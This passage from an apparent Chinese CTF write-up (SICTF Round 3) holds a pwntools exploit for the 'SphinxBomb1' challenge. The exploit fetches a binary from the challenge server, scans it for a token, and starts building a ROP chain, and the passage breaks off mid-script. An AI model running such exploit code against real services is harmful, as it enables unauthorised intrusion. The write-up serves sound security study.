                <span class="n">data</span> <span class="o">=</span> <span class="n">section</span><span class="p">.</span><span class="nf">data</span><span class="p">()</span>

                <span class="c1"># 计算节的起始地址和结束地址
</span>                <span class="n">section_start</span> <span class="o">=</span> <span class="n">section</span><span class="p">.</span><span class="n">header</span><span class="p">[</span><span class="sh">'</span><span class="s">sh_addr</span><span class="sh">'</span><span class="p">]</span>
                <span class="n">section_end</span> <span class="o">=</span> <span class="n">section_start</span> <span class="o">+</span> <span class="n">section</span><span class="p">.</span><span class="n">header</span><span class="p">[</span><span class="sh">'</span><span class="s">sh_size</span><span class="sh">'</span><span class="p">]</span>

                <span class="c1"># 如果节的结束地址在指定范围之外，则跳过该节
</span>                <span class="k">if</span> <span class="n">section_end</span> <span class="o">&lt;</span> <span class="n">start_address</span> <span class="ow">or</span> <span class="n">section_start</span> <span class="o">&gt;</span> <span class="n">end_address</span><span class="p">:</span>
                    <span class="k">continue</span>

                <span class="c1"># 在节中搜索 mov edi, 0x100 指令
</span>                <span class="n">offset</span> <span class="o">=</span> <span class="mi">0</span>
                <span class="k">while</span> <span class="n">offset</span> <span class="o">&lt;</span> <span class="nf">len</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
                    <span class="c1"># 判断指令是否为 mov edi, 0x100
</span>                    <span class="k">if</span> <span class="n">data</span><span class="p">[</span><span class="n">offset</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0xBF</span> <span class="ow">and</span> <span class="n">data</span><span class="p">[</span><span class="n">offset</span><span class="o">+</span><span class="mi">1</span><span class="p">:</span><span class="n">offset</span><span class="o">+</span><span class="mi">5</span><span class="p">]</span> <span class="o">==</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00\x01\x00\x00</span><span class="sh">'</span><span class="p">:</span>
                        <span class="n">instr_addr</span> <span class="o">=</span> <span class="n">section_start</span> <span class="o">+</span> <span class="n">offset</span>
                        <span class="c1"># 如果指令地址在指定范围内，则将其添加到结果列表中
</span>                        <span class="k">if</span> <span class="n">instr_addr</span> <span class="o">&gt;=</span> <span class="n">start_address</span> <span class="ow">and</span> <span class="n">instr_addr</span> <span class="o">&lt;=</span> <span class="n">end_address</span><span class="p">:</span>
                            <span class="n">mov_addresses</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">instr_addr</span><span class="p">)</span>

                    <span class="n">offset</span> <span class="o">+=</span> <span class="mi">1</span>

    <span class="k">return</span> <span class="n">mov_addresses</span>
<span class="n">start_address</span> <span class="o">=</span> <span class="n">backdoor</span>
<span class="n">end_address</span> <span class="o">=</span> <span class="n">backdoor</span> <span class="o">+</span> <span class="mh">0xF00</span>
<span class="n">elf_filename</span>  <span class="o">=</span> <span class="sh">'</span><span class="s">./SphinxBomb1</span><span class="sh">'</span>
<span class="n">mov_addresses</span> <span class="o">=</span> <span class="nf">find_mov_instructions</span><span class="p">(</span><span class="n">elf_filename</span><span class="p">,</span> <span class="n">start_address</span><span class="p">,</span> <span class="n">end_address</span><span class="p">)</span>

<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Addresses of </span><span class="sh">'</span><span class="s">mov edi, 0x100</span><span class="sh">'</span><span class="s"> instructions in the range {} - {}:</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="nf">hex</span><span class="p">(</span><span class="n">start_address</span><span class="p">),</span> <span class="nf">hex</span><span class="p">(</span><span class="n">end_address</span><span class="p">)))</span>
<span class="nf">print</span><span class="p">(</span><span class="n">mov_addresses</span><span class="p">)</span>
<span class="c1">#exit()
</span><span class="k">for</span> <span class="n">addr</span> <span class="ow">in</span> <span class="n">mov_addresses</span><span class="p">:</span>
    <span class="n">t</span> <span class="o">=</span> <span class="n">addr</span> <span class="o">-</span> <span class="mh">0x31</span>

<span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">[+] </span><span class="sh">'</span><span class="p">,</span> <span class="nf">hex</span><span class="p">(</span><span class="n">t</span><span class="p">))</span>
<span class="k">def</span> <span class="nf">read_bytes_at_address</span><span class="p">(</span><span class="n">target_addr</span><span class="p">):</span>
    <span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="n">elf_filename</span><span class="p">,</span> <span class="sh">'</span><span class="s">rb</span><span class="sh">'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
        <span class="c1"># 定位到指定地址
</span>        <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="nf">read</span><span class="p">()</span>
        <span class="k">for</span> <span class="n">addrs</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mh">0x2000</span><span class="p">,</span><span class="mh">0x48000</span><span class="p">):</span>
            <span class="k">if</span>  <span class="n">data</span><span class="p">[</span><span class="n">addrs</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x0f</span><span class="p">:</span>
                <span class="k">if</span>  <span class="n">data</span><span class="p">[</span><span class="n">addrs</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x84</span><span class="p">:</span>
                    <span class="n">p</span> <span class="o">=</span> <span class="p">(</span><span class="nf">u32</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="n">addrs</span><span class="o">+</span><span class="mi">2</span><span class="p">:</span><span class="n">addrs</span><span class="o">+</span><span class="mi">6</span><span class="p">])</span> <span class="o">+</span> <span class="mi">6</span> <span class="o">+</span> <span class="n">addrs</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x400000</span>
                    <span class="k">if</span> <span class="n">p</span> <span class="o">==</span> <span class="n">target_addr</span><span class="p">:</span>
                        <span class="k">return</span> <span class="n">addrs</span> <span class="o">+</span> <span class="mh">0x400000</span>
<span class="n">target_addr</span> <span class="o">=</span> <span class="n">t</span>
<span class="n">rs</span> <span class="o">=</span> <span class="nf">read_bytes_at_address</span><span class="p">(</span><span class="n">target_addr</span><span class="p">)</span>

<span class="nf">print</span><span class="p">(</span><span class="nf">hex</span><span class="p">(</span><span class="n">rs</span><span class="p">))</span>
<span class="n">le</span> <span class="o">=</span> <span class="n">rs</span> <span class="o">-</span> <span class="mh">0x17</span> <span class="o">+</span> <span class="mi">3</span>
<span class="n">f</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="n">elf_filename</span><span class="p">,</span><span class="sh">'</span><span class="s">rb</span><span class="sh">'</span><span class="p">)</span>
<span class="n">f</span><span class="p">.</span><span class="nf">seek</span><span class="p">(</span><span class="n">le</span><span class="o">-</span><span class="mh">0x400000</span><span class="p">)</span>
<span class="n">offset1</span> <span class="o">=</span> <span class="n">le</span> <span class="o">+</span> <span class="mi">4</span> <span class="o">+</span> <span class="nf">u32</span><span class="p">(</span><span class="n">f</span><span class="p">.</span><span class="nf">read</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
<span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">token_addr:</span><span class="sh">'</span><span class="p">,</span><span class="nf">hex</span><span class="p">(</span><span class="n">offset1</span><span class="p">))</span>

<span class="n">f</span><span class="p">.</span><span class="nf">seek</span><span class="p">(</span><span class="n">offset1</span> <span class="o">-</span> <span class="mh">0x400000</span><span class="p">)</span>
<span class="n">token</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="nf">read</span><span class="p">(</span><span class="mh">0x40</span><span class="p">)</span>
<span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">&gt;&gt;&gt;</span><span class="sh">'</span><span class="o">+</span><span class="n">token</span><span class="p">.</span><span class="nf">decode</span><span class="p">())</span>
</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<p>​<a href="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/image-20240218161620-gp5jlu2.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2024-02-20-SICTF-Round_3-WriteUps_by_AhiSec/assets/image-20240218161620-gp5jlu2.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<p>‍</p>

<ul>
  <li>完整 exploit 脚本</li>
</ul>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
173
174
175
176
177
178
179
180
181
182
</pre></td><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="n">os</span>

<span class="n">s</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sa</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">sendafter</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">sl</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sla</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">r</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span>                <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
<span class="n">ru</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delims</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span>  <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="n">delims</span><span class="p">,</span> <span class="n">drop</span><span class="p">)</span>
<span class="n">itr</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
<span class="n">uu32</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="nf">u32</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">uu64</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="nf">u64</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">ls</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">lss</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">s</span>                  <span class="p">:</span><span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="sh">'</span><span class="se">\033</span><span class="s">[1;31;40m%s --&gt; 0x%x </span><span class="se">\033</span><span class="s">[0m</span><span class="sh">'</span> <span class="o">%</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="nf">eval</span><span class="p">(</span><span class="n">s</span><span class="p">)))</span>

<span class="n">context</span><span class="p">.</span><span class="n">arch</span>      <span class="o">=</span> <span class="sh">'</span><span class="s">amd64</span><span class="sh">'</span>
<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="sh">'</span><span class="s">debug</span><span class="sh">'</span>
<span class="n">context</span><span class="p">.</span><span class="n">terminal</span>  <span class="o">=</span> <span class="p">[</span><span class="sh">'</span><span class="s">tmux</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">splitw</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">-h</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">-l</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">130</span><span class="sh">'</span><span class="p">]</span>
<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">binary</span><span class="p">,</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="sh">'''</span><span class="s">Start the exploit against the target.</span><span class="sh">'''</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">gdb</span><span class="p">.</span><span class="nf">debug</span><span class="p">([</span><span class="n">binary</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
    <span class="k">elif</span> <span class="n">args</span><span class="p">.</span><span class="n">RE</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">remote</span><span class="p">()</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">process</span><span class="p">([</span><span class="n">binary</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>



<span class="c1">#io = remote('yuanshen.life',10001)
</span><span class="n">io</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">'</span><span class="s">112.124.59.213</span><span class="sh">'</span><span class="p">,</span><span class="mi">10001</span><span class="p">)</span>
<span class="c1">#io = process('./SphinxBomb1')
</span><span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">std::io::stdin().read_line(&amp;mut line);</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">+++</span><span class="se">\n</span><span class="sh">'</span><span class="p">)</span>


<span class="n">f</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="sh">'</span><span class="s">SphinxBomb1.gz</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">wb</span><span class="sh">'</span><span class="p">)</span>

<span class="c1"># 保存 文件
</span><span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">This is your Bomb: </span><span class="se">\n</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">ru</span><span class="p">(</span><span class="sh">"</span><span class="s">b</span><span class="sh">'"</span><span class="p">)</span>
<span class="n">f</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="nf">b64d</span><span class="p">(</span><span class="nf">ru</span><span class="p">(</span><span class="sh">"'</span><span class="se">\n</span><span class="sh">"</span><span class="p">).</span><span class="nf">decode</span><span class="p">()))</span>
<span class="c1">#gdb.attach(io,'b *0x0405575')
</span><span class="n">f</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>

<span class="c1">#pause()
</span><span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="sh">'</span><span class="s">gzip -d SphinxBomb1</span><span class="sh">'</span><span class="p">)</span>
<span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="sh">'</span><span class="s">ls</span><span class="sh">'</span><span class="p">)</span>


<span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">Welcome. Now,you can talk with Sphinx. Good luck.</span><span class="se">\n</span><span class="sh">'</span><span class="p">)</span>


<span class="kn">from</span> <span class="n">elftools.elf.elffile</span> <span class="kn">import</span> <span class="n">ELFFile</span>

<span class="n">elf_filename</span>  <span class="o">=</span> <span class="sh">'</span><span class="s">./SphinxBomb1</span><span class="sh">'</span>
<span class="n">elf</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="n">elf_filename</span><span class="p">)</span>
<span class="n">function_address</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">symbols</span>
<span class="c1">#print(function_address)
</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">function_address</span><span class="p">:</span>
    <span class="k">if</span> <span class="sh">'</span><span class="s">main</span><span class="sh">'</span> <span class="ow">in</span> <span class="n">i</span><span class="p">:</span>
        <span class="n">backdoor</span>  <span class="o">=</span> <span class="n">function_address</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
        <span class="n">bd_name</span> <span class="o">=</span> <span class="n">i</span>
        <span class="k">break</span>
<span class="c1">#cross_references = []
#function_name = bd_name
</span><span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">main:</span><span class="sh">"</span><span class="p">,</span><span class="nf">hex</span><span class="p">(</span><span class="n">backdoor</span><span class="p">))</span>
<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">name:</span><span class="sh">"</span><span class="p">,</span><span class="n">bd_name</span><span class="p">)</span>


<span class="c1"># ChatGPT
</span><span class="k">def</span> <span class="nf">find_mov_instructions</span><span class="p">(</span><span class="n">elf_filename</span><span class="p">,</span> <span class="n">start_address</span><span class="p">,</span> <span class="n">end_address</span><span class="p">):</span>
    <span class="n">mov_addresses</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="n">elf_filename</span><span class="p">,</span> <span class="sh">'</span><span class="s">rb</span><span class="sh">'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
        <span class="n">elffile</span> <span class="o">=</span> <span class="nc">ELFFile</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>

        <span class="c1"># 遍历所有节
</span>        <span class="k">for</span> <span class="n">section</span> <span class="ow">in</span> <span class="n">elffile</span><span class="p">.</span><span class="nf">iter_sections</span><span class="p">():</span>
            <span class="c1"># 只查找可执行节
</span>            <span class="k">if</span> <span class="n">section</span><span class="p">.</span><span class="n">header</span><span class="p">[</span><span class="sh">'</span><span class="s">sh_type</span><span class="sh">'</span><span class="p">]</span> <span class="o">==</span> <span class="sh">'</span><span class="s">SHT_PROGBITS</span><span class="sh">'</span><span class="p">:</span>
                <span class="n">data</span> <span class="o">=</span> <span class="n">section</span><span class="p">.</span><span class="nf">data</span><span class="p">()</span>

                <span class="c1"># 计算节的起始地址和结束地址
</span>                <span class="n">section_start</span> <span class="o">=</span> <span class="n">section</span><span class="p">.</span><span class="n">header</span><span class="p">[</span><span class="sh">'</span><span class="s">sh_addr</span><span class="sh">'</span><span class="p">]</span>
                <span class="n">section_end</span> <span class="o">=</span> <span class="n">section_start</span> <span class="o">+</span> <span class="n">section</span><span class="p">.</span><span class="n">header</span><span class="p">[</span><span class="sh">'</span><span class="s">sh_size</span><span class="sh">'</span><span class="p">]</span>

                <span class="c1"># 如果节的结束地址在指定范围之外，则跳过该节
</span>                <span class="k">if</span> <span class="n">section_end</span> <span class="o">&lt;</span> <span class="n">start_address</span> <span class="ow">or</span> <span class="n">section_start</span> <span class="o">&gt;</span> <span class="n">end_address</span><span class="p">:</span>
                    <span class="k">continue</span>

                <span class="c1"># 在节中搜索 mov edi, 0x100 指令
</span>                <span class="n">offset</span> <span class="o">=</span> <span class="mi">0</span>
                <span class="k">while</span> <span class="n">offset</span> <span class="o">&lt;</span> <span class="nf">len</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
                    <span class="c1"># 判断指令是否为 mov edi, 0x100
</span>                    <span class="k">if</span> <span class="n">data</span><span class="p">[</span><span class="n">offset</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0xBF</span> <span class="ow">and</span> <span class="n">data</span><span class="p">[</span><span class="n">offset</span><span class="o">+</span><span class="mi">1</span><span class="p">:</span><span class="n">offset</span><span class="o">+</span><span class="mi">5</span><span class="p">]</span> <span class="o">==</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00\x01\x00\x00</span><span class="sh">'</span><span class="p">:</span>
                        <span class="n">instr_addr</span> <span class="o">=</span> <span class="n">section_start</span> <span class="o">+</span> <span class="n">offset</span>
                        <span class="c1"># 如果指令地址在指定范围内，则将其添加到结果列表中
</span>                        <span class="k">if</span> <span class="n">instr_addr</span> <span class="o">&gt;=</span> <span class="n">start_address</span> <span class="ow">and</span> <span class="n">instr_addr</span> <span class="o">&lt;=</span> <span class="n">end_address</span><span class="p">:</span>
                            <span class="n">mov_addresses</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">instr_addr</span><span class="p">)</span>

                    <span class="n">offset</span> <span class="o">+=</span> <span class="mi">1</span>

    <span class="k">return</span> <span class="n">mov_addresses</span>
<span class="n">start_address</span> <span class="o">=</span> <span class="n">backdoor</span>
<span class="n">end_address</span> <span class="o">=</span> <span class="n">backdoor</span> <span class="o">+</span> <span class="mh">0x900</span>
<span class="n">mov_addresses</span> <span class="o">=</span> <span class="nf">find_mov_instructions</span><span class="p">(</span><span class="n">elf_filename</span><span class="p">,</span> <span class="n">start_address</span><span class="p">,</span> <span class="n">end_address</span><span class="p">)</span>

<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Addresses of </span><span class="sh">'</span><span class="s">mov edi, 0x100</span><span class="sh">'</span><span class="s"> instructions in the range {} - {}:</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="nf">hex</span><span class="p">(</span><span class="n">start_address</span><span class="p">),</span> <span class="nf">hex</span><span class="p">(</span><span class="n">end_address</span><span class="p">)))</span>
<span class="k">for</span> <span class="n">addr</span> <span class="ow">in</span> <span class="n">mov_addresses</span><span class="p">:</span>
    <span class="n">t</span> <span class="o">=</span> <span class="n">addr</span> <span class="o">-</span> <span class="mh">0x31</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">yes.....</span><span class="sh">'</span><span class="p">)</span>

<span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">[+] </span><span class="sh">'</span><span class="p">,</span> <span class="nf">hex</span><span class="p">(</span><span class="n">t</span><span class="p">))</span>
<span class="k">def</span> <span class="nf">read_bytes_at_address</span><span class="p">(</span><span class="n">target_addr</span><span class="p">):</span>
    <span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="n">elf_filename</span><span class="p">,</span> <span class="sh">'</span><span class="s">rb</span><span class="sh">'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
        <span class="c1"># 定位到指定地址
</span>        <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="nf">read</span><span class="p">()</span>
        <span class="k">for</span> <span class="n">addrs</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mh">0x2000</span><span class="p">,</span><span class="mh">0x48000</span><span class="p">):</span>
            <span class="k">if</span>  <span class="n">data</span><span class="p">[</span><span class="n">addrs</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x0f</span><span class="p">:</span>
                <span class="k">if</span>  <span class="n">data</span><span class="p">[</span><span class="n">addrs</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x84</span><span class="p">:</span>
                    <span class="n">p</span> <span class="o">=</span> <span class="p">(</span><span class="nf">u32</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="n">addrs</span><span class="o">+</span><span class="mi">2</span><span class="p">:</span><span class="n">addrs</span><span class="o">+</span><span class="mi">6</span><span class="p">])</span> <span class="o">+</span> <span class="mi">6</span> <span class="o">+</span> <span class="n">addrs</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x400000</span>
                    <span class="k">if</span> <span class="n">p</span> <span class="o">==</span> <span class="n">target_addr</span><span class="p">:</span>
                        <span class="k">return</span> <span class="n">addrs</span> <span class="o">+</span> <span class="mh">0x400000</span>
<span class="n">target_addr</span> <span class="o">=</span> <span class="n">t</span>
<span class="n">rs</span> <span class="o">=</span> <span class="nf">read_bytes_at_address</span><span class="p">(</span><span class="n">target_addr</span><span class="p">)</span>

<span class="nf">print</span><span class="p">(</span><span class="nf">hex</span><span class="p">(</span><span class="n">rs</span><span class="p">))</span>
<span class="n">le</span> <span class="o">=</span> <span class="n">rs</span> <span class="o">-</span> <span class="mh">0x17</span> <span class="o">+</span> <span class="mi">3</span>
<span class="n">f</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="n">elf_filename</span><span class="p">,</span><span class="sh">'</span><span class="s">rb</span><span class="sh">'</span><span class="p">)</span>
<span class="n">f</span><span class="p">.</span><span class="nf">seek</span><span class="p">(</span><span class="n">le</span><span class="o">-</span><span class="mh">0x400000</span><span class="p">)</span>
<span class="n">offset1</span> <span class="o">=</span> <span class="n">le</span> <span class="o">+</span> <span class="mi">4</span> <span class="o">+</span> <span class="nf">u32</span><span class="p">(</span><span class="n">f</span><span class="p">.</span><span class="nf">read</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
<span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">token_addr:</span><span class="sh">'</span><span class="p">,</span><span class="nf">hex</span><span class="p">(</span><span class="n">offset1</span><span class="p">))</span>

<span class="n">f</span><span class="p">.</span><span class="nf">seek</span><span class="p">(</span><span class="n">offset1</span> <span class="o">-</span> <span class="mh">0x400000</span><span class="p">)</span>
<span class="n">token</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="nf">read</span><span class="p">(</span><span class="mh">0x40</span><span class="p">)</span>
<span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">&gt;&gt;&gt;</span><span class="sh">'</span><span class="o">+</span><span class="n">token</span><span class="p">.</span><span class="nf">decode</span><span class="p">())</span>
<span class="nf">sl</span><span class="p">(</span><span class="n">token</span><span class="p">)</span>


<span class="n">rop</span> <span class="o">=</span> <span class="nc">ROP</span><span class="p">(</span><span class="sh">'</span><span class="s">./SphinxBomb1</span><span class="sh">'</span><span class="p">)</span>
<span class="n">elf</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">'</span><span class="s">./SphinxBomb1</span><span class="sh">'</span><span class="p">)</span>
<span class="k">try</span><span class="p">:</span>
    <span class="n">rax</span> <span class="o">=</span> <span class="n">rop</span><span class="p">.</span><span class="nf">find_gadget</span><span class="p">([</span><span class="sh">'</span><span class="s">pop rax</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">ret</span><span class="sh">'</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
    <span class="n">rdi</span> <span class="o">=</span> <span class="n">rop</span><span class="p">.</span><span class="nf">find_gadget</span><span class="p">([</span><span class="sh">'</span><span class="s">pop rdi</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">ret</span><span class="sh">'</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
    <span class="n">rsi</span> <span class="o">=</span> <span class="n">rop</span><span class="p">.</span><span class="nf">find_gadget</span><span class="p">([</span><span class="sh">'</span><span class="s">pop rsi</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">ret</span><span class="sh">'</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
    <span class="n">rcx</span> <span class="o">=</span> <span class="n">rop</span><span class="p">.</span><span class="nf">find_gadget</span><span class="p">([</span><span class="sh">'</span><span class="s">pop rcx</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">ret</span><span class="sh">'</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
<span class="k">except</span><span class="p">:</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">no gadget</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">exit</span><span class="p">()</span>

<span class="n">mov_rdx_rcx</span> <span class="o">=</span> <span class="nf">next</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="nf">search</span><span class="p">(</span><span class="nf">asm</span><span class="p">(</span><span class="sh">'</span><span class="s">mov rdx,rcx; ret</span><span class="sh">'</span><span class="p">)))</span>
<span class="n">mov_rdx_rcx</span> <span class="o">=</span> <span class="nf">next</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="nf">search</span><span class="p">(</span><span class="nf">asm</span><span class="p">(</span><span class="sh">'</span><span class="s">mov rdx,rcx; ret</span><span class="sh">'</span><span class="p">)))</span>
